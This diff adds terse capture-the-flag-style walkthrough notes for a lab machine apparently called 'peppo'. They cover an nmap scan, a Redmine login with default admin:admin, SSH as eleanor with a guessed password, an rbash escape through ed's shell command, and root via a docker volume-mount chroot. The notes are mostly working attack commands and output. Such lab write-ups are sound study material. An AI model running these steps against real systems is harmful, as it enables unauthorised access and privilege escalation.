@@ -1,0 +1,92 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.131.60 > Peppo.txt
+PORT      STATE SERVICE           VERSION
+22/tcp    open  ssh               OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 75:4c:02:01:fa:1e:9f:cc:e4:7b:52:fe:ba:36:85:a9 (RSA)
+|   256 b7:6f:9c:2b:bf:fb:04:62:f4:18:c9:38:f4:3d:6b:2b (ECDSA)
+|_  256 98:7f:b6:40:ce:bb:b5:57:d5:d1:3c:65:72:74:87:c3 (ED25519)
+|_auth-owners: root
+113/tcp   open  ident             FreeBSD identd
+|_auth-owners: nobody
+5432/tcp  open  postgresql        PostgreSQL DB
+| fingerprint-strings: 
+|   Kerberos: 
+|     SFATAL
+|     VFATAL
+|     C0A000
+|     Munsupported frontend protocol 27265.28208: server supports 2.0 to 3.0
+|     Fpostmaster.c
+|     L2071
+|     RProcessStartupPacket
+|   SMBProgNeg: 
+|     SFATAL
+|     VFATAL
+|     C0A000
+|     Munsupported frontend protocol 65363.19778: server supports 2.0 to 3.0
+|     Fpostmaster.c
+|     L2071
+|_    RProcessStartupPacket
+8080/tcp  open  http              WEBrick httpd 1.4.2 (Ruby 2.6.6 (2020-03-31))
+| http-robots.txt: 4 disallowed entries 
+|_/issues/gantt /issues/calendar /activity /search
+|_http-server-header: WEBrick/1.4.2 (Ruby/2.6.6/2020-03-31)
+|_http-favicon: Unknown favicon MD5: D316E1622C58825727E7E4E6C954D289
+|_http-title: Redmine
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+10000/tcp open  snet-sensor-mgmt?
+|_auth-owners: eleanor
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
+|     HTTP/1.1 400 Bad Request
+|     Connection: close
+|   FourOhFourRequest: 
+|     HTTP/1.1 200 OK
+|     Content-Type: text/plain
+|     Date: Sat, 23 May 2026 01:19:08 GMT
+|     Connection: close
+|     Hello World
+|   GetRequest, HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Content-Type: text/plain
+|     Date: Sat, 23 May 2026 01:19:03 GMT
+|     Connection: close
+|_    Hello World
+
+Service Info: OSs: Linux, FreeBSD; CPE: cpe:/o:linux:linux_kernel, cpe:/o:freebsd:freebsd
+
+
+port 8080 login with admin:admin
+Redmine version                4.1.1.stable
+Ruby version                   2.6.6-p146 (2020-03-31) [x86_64-linux]
+robots.txt
+User-agent: *
+Disallow: /issues/gantt
+Disallow: /issues/calendar
+Disallow: /activity
+Disallow: /search
+http://192.168.131.60:8080/issues.pdf
+
+10000/tcp open  snet-sensor-mgmt?
+|_auth-owners: eleanor
+
+$ ssh eleanor@192.168.131.60
+eleanor:eleanor
+Linux peppo 4.9.0-12-amd64 #1 SMP Debian 4.9.210-1 (2020-01-20) x86_64
+# With rbash Restricted Bash, try below to understand which cmd can use.
+eleanor@peppo:~$ echo $PATH
+/home/eleanor/bin
+eleanor@peppo:~$ ls bin
+chmod  chown  ed  ls  mv  ping  sleep  touch
+eleanor@peppo:~$ ed
+!/bin/sh
+$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+$ id
+uid=1000(eleanor) gid=1000(eleanor) groups=1000(eleanor),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),999(docker)
+
+# With docker groups
+docker ps # Found current running container
+eleanor@peppo:/dev/shm$ docker run -v /:/mnt --rm -it redmine chroot /mnt
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
